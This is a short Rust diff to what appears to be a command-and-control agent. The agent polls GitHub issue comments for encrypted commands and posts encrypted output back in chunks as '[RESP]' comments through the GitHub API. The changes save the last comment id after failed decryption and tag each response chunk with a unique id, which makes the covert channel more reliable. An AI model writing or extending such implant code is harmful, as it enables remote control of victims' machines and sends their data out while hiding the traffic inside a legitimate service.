@@ -602,6 +602,8 @@ async fn check_commands(
                     }
                     Err(e) => {
                         debug_log(&format!("Decryption failed: {}", e));
+                        *last_comment_id = comment_id;
+                        save_last_comment_id(*last_comment_id);
                     }
                 }
             }
@@ -617,6 +619,12 @@ async fn send_response_chunks(
     output: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
     const CHUNK_SIZE: usize = 50000;
+    let response_id = format!(
+        "{}-{}-{}",
+        chrono::Utc::now().timestamp_millis(),
+        issue_number,
+        rand::random::<u64>()
+    );
 
     let url = format!("https://api.github.com/repos/{}/{}/issues/{}/comments",
         config.github_owner, config.github_repo, issue_number);
@@ -645,7 +653,7 @@ async fn send_response_chunks(
         let total_chunks = chunks.len();
 
         for (i, chunk) in chunks.iter().enumerate() {
-            let msg = format!("[Part {}/{}]\n{}", i + 1, total_chunks, chunk);
+            let msg = format!("[Part {}/{}/{}]\n{}", response_id, i + 1, total_chunks, chunk);
             let encrypted = crate::crypto::encrypt(&msg, &config.password)?;
             let response = format!("[RESP]{}", encrypted);
             let payload = serde_json::json!({"body": response});
